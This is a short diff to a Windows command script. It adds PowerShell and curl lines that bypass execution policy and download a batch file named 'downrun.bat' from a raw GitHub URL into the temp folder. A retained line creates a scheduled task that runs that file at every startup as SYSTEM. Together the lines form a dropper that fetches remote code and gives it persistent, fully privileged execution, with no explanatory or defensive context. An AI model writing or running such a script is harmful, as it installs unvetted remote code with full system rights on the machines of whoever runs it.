@@ -1,4 +1,6 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Tumelo0321/code25/refs/heads/main/downrun.bat' -OutFile $env:TEMP\script.bat"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Tumelo0321/code25/refs/heads/main/downrun.bat' -OutFile $env:TEMP\downrun.bat"
+
+curl -o %TEMP%\script.bat https://raw.githubusercontent.com/Tumelo0321/code25/refs/heads/main/downrun.bat
 
 
 schtasks /create /tn "MyPowerShell" /tr "C:\Windows\Temp\downrun.bat" /sc onstart /ru SYSTEM /f
